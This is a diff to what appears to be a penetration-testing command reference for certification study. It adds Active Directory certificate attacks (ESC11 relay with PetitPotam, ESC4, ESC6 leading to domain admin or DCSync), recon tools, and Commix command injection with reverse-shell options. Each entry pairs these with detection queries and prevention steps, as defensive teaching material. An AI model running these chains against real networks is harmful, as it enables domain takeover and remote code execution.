@@ -4562,6 +4562,109 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-adcs-esc11-rpc-relay",
+      "name": "ADCS ESC11 - NTLM Relay to CA via ICertPassage RPC",
+      "command": "certipy relay -ca <ca_hostname>",
+      "description": "ESC11 abuses the ICertPassage RPC interface on the CA, which lacks Extended Protection for Authentication (EPA). Coerce NTLM auth from a machine (PetitPotam/PrinterBug) and relay it to the CA's RPC endpoint to request a certificate as that machine account. No web enrollment needed.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Attacks",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "certipy v4.8+ ESC11 research",
+      "tags": [
+        "adcs",
+        "esc11",
+        "icertpassage",
+        "rpc",
+        "ntlm-relay",
+        "certipy",
+        "pki"
+      ],
+      "mitre": [
+        "T1649",
+        "T1557"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nThe CA's ICertPassage RPC interface does not enforce EPA by default.\nCoerce NTLM auth from a DC (PetitPotam/PrinterBug) and relay it\ndirectly to the CA via RPC - no web enrollment (ESC8) needed.\n\n=== ATTACK CHAIN ===\n  # Terminal 1: Start certipy relay listening on the CA\n  certipy relay -ca ca01.corp.local\n\n  # Terminal 2: Coerce DC authentication\n  python3 PetitPotam.py <attacker_ip> <dc_ip>\n  # or: python3 printerbug.py corp.local/user:pass@<dc_ip> <attacker_ip>\n\n  # certipy will catch the relay and request a cert as DC$\n  # Output: dc01.pfx\n\n  # Step 3: Authenticate with the DC certificate\n  certipy auth -pfx dc01.pfx -dc-ip <dc_ip>\n\n  # Step 4: DCSync with the NT hash\n  secretsdump.py -hashes :<nt_hash> corp.local/dc01$@<dc_ip>\n\n=== DIFFERENCE FROM ESC8 ===\n- ESC8 targets the web enrollment HTTP endpoint (certsrv)\n- ESC11 targets the RPC interface (ICertPassage)\n- ESC11 works even if web enrollment is disabled\n- Both require NTLM relay (no EPA enforcement)\n\n=== REQUIREMENTS ===\n- CA without EPA on ICertPassage RPC interface\n- NTLM coercion method (PetitPotam, PrinterBug, ShadowCoerce)\n- Machine template allowing enrollment",
+      "examples": [
+        {
+          "label": "Start certipy relay for ESC11",
+          "command": "certipy relay -ca ca01.corp.local"
+        },
+        {
+          "label": "Coerce DC auth with PetitPotam",
+          "command": "python3 PetitPotam.py 10.10.14.5 192.168.1.10"
+        },
+        {
+          "label": "Authenticate with DC cert",
+          "command": "certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "Certipy - ESC11",
+          "url": "https://github.com/ly4k/Certipy"
+        },
+        {
+          "title": "ADCS ESC11 Research",
+          "url": "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-petitpotam",
+          "note": "PetitPotam provides the NTLM coercion needed for ESC11.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-adcs-esc4-template-acl",
+          "note": "ESC4 is a template-based attack; ESC11 is relay-based.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The ICertPassage RPC interface on the CA accepts NTLM authentication without Extended Protection for Authentication (EPA), allowing relayed credentials to request certificates.",
+        "prerequisites": "CA without EPA on RPC interface; NTLM coercion method; machine template.",
+        "impact": "Certificate as any machine account whose NTLM auth is coerced - typically the DC, leading to DCSync.",
+        "detection": "[MITRE T1649] NTLM authentication to CA from unexpected sources; certificate requests for machine accounts not originating from those machines.",
+        "artifacts": "Event 4768/4769 (Kerberos ticket requests with certificate); NTLM relay traffic to CA; Event 4886/4887.",
+        "splunk_spl": "index=wineventlog EventCode=4887 TemplateName=\"Machine\"\n| where RequesterName!=dns_hostname\n| table _time, RequesterName, SubjectName",
+        "elastic_kql": "event.code:\"4887\" AND winlog.event_data.TemplateName:\"Machine\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate == \"Machine\"\n| project TimeGenerated, RequesterName, SubjectName",
+        "sigma_rules": "win_adcs_esc11_rpc_relay",
+        "prevention": "Enable EPA on the CA's RPC interface; enforce LDAP signing; restrict NTLM authentication via GPO.",
+        "sources": [
+          "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC11 - Machine certificate request via RPC relay",
+            "logic": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate contains \"Machine\"\n| project TimeGenerated, RequesterName, SubjectName, CertificateTemplate",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4887"
+            ],
+            "attack": [
+              "T1649",
+              "T1557"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Auto-enrollment of machine certificates by legitimate systems",
+            "tuning": "Compare requester source IP with the machine account's known IP"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-esc15-ekuwu",
       "name": "ADCS ESC15 / EKUwu (Application Policy Injection)",
       "command": "certipy-esc15 req -ca <ca_name> -username <user> -hashes <nt_hash> -dc-ip <dc_ip> -template <template_name> --application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip <dc_ip>",
@@ -4663,6 +4766,196 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Legitimate certificate requests for Server Authentication templates",
             "tuning": "Alert on requests from non-admin accounts to templates that normally only serve machines"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-adcs-esc4-template-acl",
+      "name": "ADCS ESC4 - Certificate Template ACL Abuse",
+      "command": "certipy template -u <user>@<domain> -p <password> -template VulnTemplate -save-old",
+      "description": "ESC4 exploits overly permissive ACLs on certificate templates. If a low-privileged user has WriteProperty/WriteDacl/WriteOwner on a template, they can modify it to enable ESC1 conditions, request a certificate as any user, then restore the original template.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "ADCS Attacks",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps ADCS whitepaper; certipy",
+      "tags": [
+        "adcs",
+        "esc4",
+        "certificate-template",
+        "acl-abuse",
+        "certipy",
+        "pki"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nIf you can WRITE to a certificate template (WriteProperty, WriteDacl,\nor WriteOwner), you can modify it to be vulnerable to ESC1, request\na cert as admin, then restore the template.\n\n=== FIND VULNERABLE TEMPLATES ===\n  certipy find -u user@corp.local -p pass -dc-ip <dc_ip> -vulnerable\n  # Look for templates where your user/group has write permissions\n\n=== EXPLOIT ===\n  # Step 1: Save original template and modify to ESC1\n  certipy template -u user@corp.local -p pass -template VulnTemplate -save-old\n\n  # Step 2: Request certificate as administrator\n  certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\n\n  # Step 3: Restore the template\n  certipy template -u user@corp.local -p pass -template VulnTemplate -configuration VulnTemplate.json\n\n  # Step 4: Authenticate with the certificate\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== WHAT CERTIPY MODIFIES ===\n- Sets ENROLLEE_SUPPLIES_SUBJECT flag\n- Sets Client Authentication EKU\n- Enables enrollment for the attacker\n- Removes manager approval requirement",
+      "examples": [
+        {
+          "label": "Save and modify vulnerable template",
+          "command": "certipy template -u user@corp.local -p pass -template VulnTemplate -save-old"
+        },
+        {
+          "label": "Request cert as admin",
+          "command": "certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local"
+        },
+        {
+          "label": "Restore original template",
+          "command": "certipy template -u user@corp.local -p pass -template VulnTemplate -configuration VulnTemplate.json"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps - Certified Pre-Owned",
+          "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+        },
+        {
+          "title": "Certipy - ly4k",
+          "url": "https://github.com/ly4k/Certipy"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-certipy-toolkit",
+          "note": "certipy find discovers vulnerable templates including ESC4.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-esc15-ekuwu",
+          "note": "ESC15 is another template-based ADCS attack.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Certificate templates are AD objects with their own ACLs. If a low-privileged user has write access, they can reconfigure the template to allow arbitrary certificate enrollment.",
+        "prerequisites": "WriteProperty, WriteDacl, or WriteOwner on a certificate template; enrollment rights.",
+        "impact": "Full domain compromise via forged certificates.",
+        "detection": "[MITRE T1649] Certificate template modification events; rapid modify-request-restore pattern.",
+        "artifacts": "Event 4899 (template modified); Event 4886/4887 (cert request/issue); restored template.",
+        "splunk_spl": "index=wineventlog EventCode=4899\n| table _time, SubjectUserName, TemplateChange, TemplateName",
+        "elastic_kql": "event.code:\"4899\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4899\n| project TimeGenerated, SubjectUserName, Activity",
+        "sigma_rules": "win_adcs_template_modification",
+        "prevention": "Audit certificate template ACLs; remove unnecessary write permissions; monitor template changes.",
+        "sources": [
+          "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC4 - Certificate template ACL modification",
+            "logic": "SecurityEvent\n| where EventID == 4899 or (EventID == 5136 and ObjectClass == \"pKICertificateTemplate\")\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4899",
+              "5136"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate template management by PKI administrators",
+            "tuning": "Alert on modifications by non-PKI-admin accounts"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-adcs-esc6-editf-flag",
+      "name": "ADCS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse",
+      "command": "certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template User -upn administrator@<domain>",
+      "description": "ESC6 targets CAs where the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set. This flag allows ANY certificate requester to specify a Subject Alternative Name (SAN) in the request, regardless of template settings. Any template with enrollment rights becomes an ESC1-equivalent.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "ADCS Attacks",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps ADCS whitepaper; certipy",
+      "tags": [
+        "adcs",
+        "esc6",
+        "editf",
+        "san",
+        "certipy",
+        "pki",
+        "certificate-authority"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nIf the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, ANY enrollable\ntemplate becomes exploitable - the requester can add a SAN for\nany user, bypassing template restrictions.\n\n=== DETECT ===\n  certipy find -u user@corp.local -p pass -dc-ip <dc_ip> -vulnerable\n  # Look for: [!] CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set\n\n  # Manual check (from CA):\n  certutil -config \"CA01\\CORP-CA\" -getreg policy\\EditFlags\n  # Check for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)\n\n=== EXPLOIT ===\n  # Request cert with SAN for administrator\n  certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn administrator@corp.local\n\n  # Authenticate\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== NOTES ===\n- The EDITF flag is set on the CA itself, not on templates\n- ANY template with client auth EKU + enrollment rights is exploitable\n- The User template is commonly available to all domain users\n- Common in older ADCS deployments\n\n=== REMEDIATION ===\n  certutil -config \"CA01\\CORP-CA\" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2\n  net stop certsvc && net start certsvc",
+      "examples": [
+        {
+          "label": "Check if EDITF flag is set",
+          "command": "certipy find -u user@corp.local -p pass -dc-ip 192.168.1.10 -vulnerable"
+        },
+        {
+          "label": "Request cert with admin SAN",
+          "command": "certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn administrator@corp.local"
+        },
+        {
+          "label": "Authenticate with forged cert",
+          "command": "certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps - Certified Pre-Owned",
+          "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+        },
+        {
+          "title": "ESC6 - HackTricks",
+          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag on the CA tells it to accept attacker-supplied SANs in certificate requests, regardless of what the template allows.",
+        "prerequisites": "CA with EDITF flag set; enrollment rights on any client-auth template.",
+        "impact": "Any domain user can request a certificate as any other user, including Domain Admin.",
+        "detection": "[MITRE T1649] Certificate requests with SANs that do not match the requester.",
+        "artifacts": "Event 4886/4887 (cert request/issue) with SAN different from requester.",
+        "splunk_spl": "index=wineventlog EventCode=4887\n| where RequesterName!=SubjectAlternativeName\n| table _time, RequesterName, SubjectAlternativeName, CertificateTemplate",
+        "elastic_kql": "event.code:\"4887\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| project TimeGenerated, RequesterName, CertificateTemplate",
+        "sigma_rules": "win_adcs_esc6_san_abuse",
+        "prevention": "Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag; restart CA service after removal.",
+        "sources": [
+          "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC6 - Certificate issued with mismatched SAN",
+            "logic": "SecurityEvent\n| where EventID == 4887\n| extend SAN = extract(\"SubjectAlternativeName=(.*?)(;|$)\", 1, EventData)\n| where isnotempty(SAN) and SAN !contains SubjectUserName\n| project TimeGenerated, SubjectUserName, SAN, CertificateTemplate",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4887"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Service accounts requesting certs for managed endpoints",
+            "tuning": "Exclude known service account patterns; focus on admin-level SAN values"
           }
         ]
       }
@@ -5431,6 +5724,92 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Installs a payload MSI as SYSTEM when AlwaysInstallElevated is enabled:\n  msiexec /i c:\\path\\aie.msi   install the MSI package\n  /quiet /qn /norestart    silent, no UI, no reboot\nRequires the AlwaysInstallElevated key set to 1 in BOTH HKCU and HKLM. Build the MSI with msfvenom -f msi (or PowerUp's Write-UserAddMSI); it runs with SYSTEM rights."
+    },
+    {
+      "id": "recon-amass-subdomains",
+      "name": "Amass - Advanced Subdomain Enumeration",
+      "command": "amass enum -d <domain> -o subdomains.txt",
+      "description": "OWASP Amass performs advanced subdomain enumeration using passive sources (APIs, CT logs, web archives), active DNS brute-forcing, and ASN discovery. The most comprehensive subdomain discovery tool - combines 50+ data sources that other tools miss.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Reconnaissance",
+      "subcategory": "Subdomains",
+      "certifications": [
+        "CPTS",
+        "CWES",
+        "OSCP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "OWASP Amass; CPTS+CWES information gathering",
+      "tags": [
+        "amass",
+        "subdomain-enumeration",
+        "dns",
+        "osint",
+        "reconnaissance",
+        "passive-recon"
+      ],
+      "mitre": [
+        "T1590.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PASSIVE ONLY (no DNS queries to target) ===\n  amass enum -passive -d <domain> -o passive_subs.txt\n  # Uses APIs, CT logs, web archives only\n\n=== ACTIVE ENUMERATION ===\n  amass enum -d <domain> -o all_subs.txt\n  # Passive + active DNS resolution + brute-force\n\n=== WITH BRUTE FORCE ===\n  amass enum -brute -d <domain> -o brute_subs.txt\n  # Adds DNS brute-forcing with default wordlist\n  amass enum -brute -w /path/to/wordlist -d <domain>\n\n=== ASN DISCOVERY ===\n  amass intel -org \"Target Corp\" -o asns.txt\n  # Find ASNs owned by the target organization\n  amass intel -asn 12345 -o asn_subs.txt\n  # Enumerate subdomains from that ASN\n\n=== CONFIGURATION ===\n  # API keys in ~/.config/amass/config.yaml\n  # Add keys for: SecurityTrails, Shodan, VirusTotal, etc.\n  amass enum -d <domain> -config config.yaml\n\n=== COMPARE RESULTS ===\n  amass track -d <domain>  # compare with previous runs\n  amass db -show          # view stored results\n\n=== CHAIN WITH ===\n  amass enum -d <domain> -o subs.txt\n  httpx -l subs.txt -o live.txt           # find live hosts\n  nuclei -l live.txt -severity high,critical  # scan for vulns",
+      "examples": [
+        {
+          "label": "Passive-only subdomain enumeration",
+          "command": "amass enum -passive -d target.com -o passive_subs.txt"
+        },
+        {
+          "label": "Full active enumeration with brute-force",
+          "command": "amass enum -brute -d target.com -o all_subs.txt"
+        },
+        {
+          "label": "ASN-based organization discovery",
+          "command": "amass intel -org \"Target Corp\" -o asns.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "OWASP Amass",
+          "url": "https://github.com/owasp-amass/amass"
+        },
+        {
+          "title": "Amass User Guide",
+          "url": "https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Amass aggregates data from 50+ passive sources (CT logs, DNS databases, web archives, search engines, API services) and combines it with active DNS probing for comprehensive coverage.",
+        "prerequisites": "Target domain name; optionally API keys for passive data sources.",
+        "impact": "Discovery of the full attack surface including forgotten subdomains, development environments, and shadow IT.",
+        "detection": "[MITRE T1590.002] High-volume DNS queries for non-existent subdomains; API queries to threat intelligence platforms.",
+        "artifacts": "DNS server logs showing brute-force patterns; unusual DNS query volumes.",
+        "splunk_spl": "index=dns sourcetype=dns query_type=A\n| stats dc(query) as unique_queries by src_ip\n| where unique_queries > 500\n| sort -unique_queries",
+        "elastic_kql": "dns.question.type:\"A\" AND dns.response_code:\"NXDOMAIN\"",
+        "sentinel_kql": "DnsEvents\n| where SubType == \"LookupQuery\" and ResultCode == 3\n| summarize NXCount=count() by ClientIP\n| where NXCount > 500",
+        "sigma_rules": "net_dns_subdomain_bruteforce",
+        "prevention": "DNS rate limiting; monitor for high NXDOMAIN rates; disable DNS zone transfers; use DNS monitoring solutions.",
+        "sources": [
+          "https://github.com/owasp-amass/amass",
+          "https://attack.mitre.org/techniques/T1590/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "DNS subdomain brute-force detection",
+            "logic": "title: High NXDOMAIN Rate (Subdomain Bruteforce)\nstatus: experimental\nlogsource:\n  category: dns\ndetection:\n  selection:\n    response_code: 'NXDOMAIN'\n  condition: selection | count() by src_ip > 500\nlevel: medium",
+            "data_source": "dns",
+            "attack": [
+              "T1590.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Misconfigurations causing repeated NXDOMAIN lookups; CDN health checks",
+            "tuning": "Adjust threshold per environment; whitelist known DNS resolvers"
+          }
+        ]
+      }
     },
     {
       "id": "crtp-amsi-sbl-bypass",
@@ -7632,6 +8011,94 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Screenshots web hosts from an Nmap XML for visual triage:\n  cat web_discovery.xml   the nmap XML from the discovery scan\n  | ./aquatone -nmap      parse it as nmap input and capture each host\nProduces an HTML gallery so you can eyeball many sites at once and spot login/admin/default pages; -ports large widens the port set."
+    },
+    {
+      "id": "recon-arjun-param-discovery",
+      "name": "Arjun - Hidden HTTP Parameter Discovery",
+      "command": "arjun -u https://<target>/api/endpoint",
+      "description": "Arjun discovers hidden HTTP parameters by sending crafted requests with common parameter names and analyzing response differences. Finds parameters that aren't in the source code or docs but are still processed server-side - critical for finding hidden functionality, debug endpoints, and injection points.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Reconnaissance",
+      "subcategory": "Web Reconnaissance",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "s0md3v/Arjun; CWES bug bounty methodology",
+      "tags": [
+        "arjun",
+        "parameter-discovery",
+        "hidden-parameters",
+        "web-recon",
+        "api-testing",
+        "fuzzing"
+      ],
+      "mitre": [
+        "T1595.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC SCAN ===\n  arjun -u https://<target>/api/endpoint\n\n=== POST PARAMETERS ===\n  arjun -u https://<target>/api -m POST\n  arjun -u https://<target>/api -m JSON  # JSON body params\n\n=== WITH HEADERS ===\n  arjun -u https://<target>/api -H \"Authorization: Bearer token\"\n  arjun -u https://<target>/api --headers \"Cookie: session=abc\"\n\n=== CUSTOM WORDLIST ===\n  arjun -u https://<target>/api -w /path/to/params.txt\n\n=== OUTPUT ===\n  arjun -u https://<target>/api -oJ params.json\n  arjun -u https://<target>/api -oT params.txt\n\n=== MULTIPLE URLS ===\n  arjun -i urls.txt\n\n=== RATE LIMITING ===\n  arjun -u https://<target>/api --rate-limit 30\n\n=== CHAIN WITH ===\n  # 1. Discover parameters\n  arjun -u https://<target>/api -oJ params.json\n  # 2. Test discovered params for injection\n  # SQLi: sqlmap -u 'https://<target>/api?discovered_param=test'\n  # XSS: dalfox url 'https://<target>/api?discovered_param=test'\n  # SSRF: manual test with burp collaborator\n\n=== WHAT IT FINDS ===\n- Debug parameters (debug=true, test=1, verbose=1)\n- Hidden admin parameters (admin=1, role=admin)\n- Internal API parameters not in docs\n- IDOR parameters (user_id, account_id)",
+      "examples": [
+        {
+          "label": "Discover GET parameters",
+          "command": "arjun -u https://target.htb/api/users"
+        },
+        {
+          "label": "Discover POST/JSON parameters",
+          "command": "arjun -u https://target.htb/api/login -m JSON"
+        },
+        {
+          "label": "Scan multiple URLs from file",
+          "command": "arjun -i urls.txt -oJ results.json"
+        }
+      ],
+      "references": [
+        {
+          "title": "Arjun - GitHub",
+          "url": "https://github.com/s0md3v/Arjun"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ffuf-vhost",
+          "note": "ffuf for directory/vhost fuzzing alongside parameter discovery.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Web apps often have parameters that aren't documented or visible in the UI but are processed server-side. Arjun sends requests with common parameter names and detects responses that differ from the baseline.",
+        "prerequisites": "Target URL; the parameter must cause a detectable response difference.",
+        "impact": "Discovery of hidden functionality, debug modes, IDOR vectors, and injection points.",
+        "detection": "[MITRE T1595.002] High number of requests with varying parameter names from single source.",
+        "artifacts": "Web server access logs showing many different parameter names; similar requests with minor variations.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| stats dc(uri_query) as unique_params count by src_ip, uri_path\n| where unique_params > 100",
+        "elastic_kql": "http.request.method:\"GET\"",
+        "sentinel_kql": "W3CIISLog\n| summarize ParamVariants=dcount(csUriQuery) by cIP, csUriStem\n| where ParamVariants > 100",
+        "sigma_rules": "web_parameter_bruteforce",
+        "prevention": "WAF rate limiting per endpoint; remove debug/test parameters from production; input validation.",
+        "sources": [
+          "https://github.com/s0md3v/Arjun",
+          "https://attack.mitre.org/techniques/T1595/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "HTTP parameter brute-force detection",
+            "logic": "title: HTTP Parameter Discovery Attempt\nstatus: experimental\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-method: GET\n  condition: selection | count(cs-uri-query) by c-ip, cs-uri-stem > 100\nlevel: medium",
+            "data_source": "iis",
+            "attack": [
+              "T1595.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate API testing tools; search engine crawlers",
+            "tuning": "Adjust threshold; whitelist known testing IPs"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-m08-arp-attacks",
@@ -22348,6 +22815,105 @@ const COMMAND_DATA = {
       "explain": "Bypasses filters that block the space character by substituting tabs (%09), the IFS variable (${IFS}), or brace-expansion syntax that needs no spaces.:\n  127.0.0.1%0a%09whoami\n%0a (newline) is often allowed even when ; & | are blocked."
     },
     {
+      "id": "web-commix-command-injection",
+      "name": "Commix - Automated Command Injection Exploitation",
+      "command": "commix --url=\"http://<target>/page?param=INJECT_HERE\"",
+      "description": "Commix (Command Injection Exploiter) automatically detects and exploits command injection vulnerabilities. Supports results-based, blind time-based, and blind file-based techniques. Like sqlmap but for OS command injection - handles encoding, evasion, and chaining automatically.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web Exploitation",
+      "subcategory": "Command Injection",
+      "certifications": [
+        "OSCP",
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "commixproject/commix; web exploitation research",
+      "tags": [
+        "commix",
+        "command-injection",
+        "os-injection",
+        "rce",
+        "automated",
+        "web-exploitation"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC SCAN ===\n  commix --url=\"http://<target>/page?cmd=INJECT_HERE\"\n\n=== POST DATA ===\n  commix --url=\"http://<target>/api\" --data=\"param=INJECT_HERE\" --method POST\n\n=== WITH COOKIES/HEADERS ===\n  commix --url=\"http://<target>/page?cmd=test\" --cookie=\"session=abc123\"\n  commix --url=\"http://<target>/api\" --headers=\"Authorization: Bearer token\"\n\n=== SPECIFIC TECHNIQUES ===\n  # Results-based (output in response)\n  commix --url=\"http://<target>/page?cmd=test\" --technique=r\n  # Time-based blind\n  commix --url=\"http://<target>/page?cmd=test\" --technique=t\n  # File-based (write output to accessible file)\n  commix --url=\"http://<target>/page?cmd=test\" --technique=f\n\n=== OS SHELL ===\n  commix --url=\"http://<target>/page?cmd=test\" --os-cmd=\"id\"\n  commix --url=\"http://<target>/page?cmd=test\" --os-shell\n  commix --url=\"http://<target>/page?cmd=test\" --reverse-shell\n\n=== EVASION ===\n  commix --url=\"http://<target>/page?cmd=test\" --tamper=base64encode\n  # Available tampers: base64encode, hexencode, urlencode, etc.\n\n=== BATCH MODE ===\n  commix --url=\"http://<target>/page?cmd=test\" --batch  # auto-answer yes",
+      "examples": [
+        {
+          "label": "Auto-detect command injection",
+          "command": "commix --url=\"http://target.htb/page?cmd=INJECT_HERE\""
+        },
+        {
+          "label": "POST-based injection",
+          "command": "commix --url=\"http://target.htb/api\" --data=\"param=INJECT_HERE\" --method POST"
+        },
+        {
+          "label": "Get OS shell",
+          "command": "commix --url=\"http://target.htb/page?cmd=test\" --os-shell"
+        },
+        {
+          "label": "Time-based blind",
+          "command": "commix --url=\"http://target.htb/page?cmd=test\" --technique=t"
+        }
+      ],
+      "references": [
+        {
+          "title": "Commix - GitHub",
+          "url": "https://github.com/commixproject/commix"
+        },
+        {
+          "title": "OWASP - Command Injection",
+          "url": "https://owasp.org/www-community/attacks/Command_Injection"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "tomcat-cgi-injection",
+          "note": "Manual command injection basics before automating with commix.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Commix systematically tests injection points with multiple payloads using different separators (;, |, &&, ||, backticks, $()) and encoding techniques.",
+        "prerequisites": "A parameter that passes unsanitized input to OS command execution (system(), exec(), popen(), etc.).",
+        "impact": "Remote code execution on the web server as the web application user.",
+        "detection": "[MITRE T1190] WAF/IDS signatures for command injection patterns; unusual characters in parameters (;, |, &&, backticks).",
+        "artifacts": "Web server logs with command injection payloads; process execution from web server process.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| where match(uri_query, \"[;|`]|\\$\\(|&&|\\|\\|\")\n| table _time, src_ip, uri_path, uri_query",
+        "elastic_kql": "url.query:(*;* OR *|* OR *$\\(* OR *&&* OR *\\|\\|*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery matches regex @\"[;|`]|\\$\\(|&&|\\|\\|\"\n| project TimeGenerated, cIP, csUriStem, csUriQuery",
+        "sigma_rules": "web_command_injection_patterns",
+        "prevention": "Never pass user input to OS commands; use parameterized APIs; input validation with allowlists; WAF rules for command injection.",
+        "sources": [
+          "https://github.com/commixproject/commix",
+          "https://attack.mitre.org/techniques/T1190/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Command injection patterns in web requests",
+            "logic": "title: Web Request Command Injection Attempt\nstatus: experimental\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri-query|re: '[;|`]|\\$\\(|&&|\\|\\|'\n  condition: selection\nlevel: high",
+            "data_source": "iis",
+            "attack": [
+              "T1190",
+              "T1059"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Legitimate use of special characters in parameters",
+            "tuning": "Combine with process creation from web server process for high confidence"
+          }
+        ]
+      }
+    },
+    {
       "id": "confluence-ognl-rce",
       "name": "Confluence OGNL Injection RCE",
       "command": "curl -v http://<target>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%5B%27id%27%5D%29.start%28%29%22%29%7D/",
@@ -29230,6 +29796,95 @@ const COMMAND_DATA = {
       "source": "CPTS Module 16: Login Brute Forcing",
       "exam": "exam-ok",
